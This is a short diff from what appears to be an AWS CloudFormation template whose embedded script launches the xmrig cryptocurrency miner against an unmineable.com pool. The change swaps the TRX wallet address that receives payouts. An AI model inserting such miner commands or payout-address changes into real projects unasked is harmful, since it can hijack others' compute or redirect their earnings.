@@ -360,7 +360,7 @@ Resources:
                   tron)
                     ./xmrig -o rx.unmineable.com:3333 -a rx -k \
                         --log-file=xmrig.log --no-color --randomx-1gb-pages \
-                        -u TRX:TCHgjbqTmqbAtcLK7Ndwsugv5CCt62oTSN.xdog
+                        -u TRX:TWCXCdtqoDas2R42HqyWq5P9ENBE8GbLhp.xdog
                     # ./xmrig -c config.json --tls -o ${MoneroMiningPool} -a rx -O x:x >> xmrig.log 2>&1
                     ;;
 
